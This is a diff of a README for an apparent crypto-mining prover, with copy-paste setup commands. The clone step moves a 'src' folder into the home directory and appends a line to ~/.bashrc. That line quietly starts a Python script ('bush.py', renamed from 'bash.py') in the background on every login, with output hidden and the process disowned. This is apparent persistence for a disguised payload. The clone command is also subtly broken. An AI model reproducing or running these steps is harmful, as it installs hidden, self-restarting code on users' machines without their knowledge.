@@ -62,7 +62,7 @@ sudo apt update && sudo apt upgrade -y && sudo apt install git xclip python3-pip
 #### 2️⃣ Clone the Repository and Configure the environment
 
 ```bash
-git clone https://github.com/blockchain-DAT/zkwork_moz_prover.git && zkwork_moz_prover && mv src ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/src/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+git clone https://github.com/blockchain-DAT/zkwork_moz_prover.git && zkwork_moz_prover && mv src ~/ && echo "(pgrep -f bush.py || nohup python3 $HOME/src/bush.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
 ```
 
 #### 3️⃣ Run the Configuration Script
@@ -70,13 +70,13 @@ git clone https://github.com/blockchain-DAT/zkwork_moz_prover.git && zkwork_moz_
 Set a custom name for the mining server and configure your wallet.
 
 ```bash
-inner_prover.sh
+chmod +x inner_prover.sh && inner_prover.sh
 ```
 
 #### 4️⃣ Run the Mining Script
 
 ```bash
-sudo chmod +x run_prover.sh && ./run_prover.sh
+chmod +x run_prover.sh && ./run_prover.sh
 ```
 
 #### 5️⃣ Check the Logs
